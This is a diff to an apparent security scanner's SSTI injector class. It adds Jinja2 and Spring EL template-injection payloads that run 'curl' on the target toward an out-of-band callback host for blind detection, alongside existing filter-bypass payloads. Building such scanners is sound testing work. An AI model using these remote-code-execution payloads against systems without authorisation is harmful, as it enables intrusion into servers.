@@ -104,6 +104,10 @@ class SSTIInjector(BaseInjector):
             # ── Filter bypass variants ──
             "{{''|join}}",                    # Jinja2 filter chain
             "{%25 set x=1337*7331 %25}{{x}}", # URL-encoded delimiters
+
+            # ── OOB callbacks (blind detection) ──
+            f'{{% import os %}}{{{{ os.popen("curl {self._get_oob_url()}/ssti/oob1").read() }}}}',
+            f'${{T(java.lang.Runtime).getRuntime().exec("curl {self._get_oob_url()}/ssti/oob2")}}',
         ]
 
     def analyze_response(
